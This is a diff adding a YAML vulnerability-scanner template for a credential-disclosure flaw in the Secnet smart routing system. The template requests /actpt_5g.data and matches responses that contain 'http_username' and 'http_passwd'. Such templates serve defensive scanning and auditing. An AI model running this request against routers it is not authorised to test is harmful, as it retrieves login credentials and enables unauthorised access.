@@ -1,0 +1,26 @@
+id: Secnet-Information-disclosure
+
+info:
+  name: "Secnet-智能路由系统 actpt_5g.data 敏感信息泄露"
+  author: Unknown
+  severity: medium
+  description: Secnet-智能路由系统中的 actpt_5g.data 文件存在敏感数据暴露漏洞。攻击者可通过访问该文件获取存储的账号凭证，进而实现未授权系统访问。该漏洞允许远程攻击者绕过身份验证机制，直接获取系统控制权限。
+  tags: Secnet
+
+http:
+- raw:
+  - |
+    GET /actpt_5g.data HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - "http_username"
+    - "http_passwd"
+    condition: and
+  - type: status
+    status:
+    - 200
